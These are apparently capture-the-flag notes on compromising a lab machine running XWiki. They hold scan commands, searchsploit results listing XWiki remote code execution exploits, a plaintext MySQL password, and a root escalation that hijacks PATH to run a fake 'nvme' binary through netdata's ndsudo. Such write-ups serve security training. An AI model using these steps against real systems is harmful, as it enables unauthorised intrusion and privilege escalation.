nmap editor shows
22 ssh
80 http Editor app
8080 http jetty server xwiki

gobuster dir -u http://wiki.editor.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt --status-codes-blacklist 302

wiki.editor.htb/robots.txt

XWiki Debian 15.10.8 

└─$ searchsploit xwiki                 
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
XWiki 14 - SQL Injection via getdeleteddocuments.vm                                                                                                       | multiple/webapps/52384.c
XWiki 4.2-milestone-2 - Multiple Persistent Cross-Site Scripting Vulnerabilities                                                                          | php/webapps/20856.txt
Xwiki CMS 12.10.2 - Cross Site Scripting (XSS)                                                                                                            | multiple/webapps/49437.txt
XWiki Platform 15.10.10 - Remote Code Execution                                                                                                           | multiple/webapps/52136.txt
XWiki Standard 14.10 - Remote Code Execution (RCE)                                                                                                        | php/webapps/52105.py
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------

mysql -u xwiki -ptheEd1t0rTeam99 --host=localhost xwiki


compile execbash.c and rename nvme
PATH=.:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
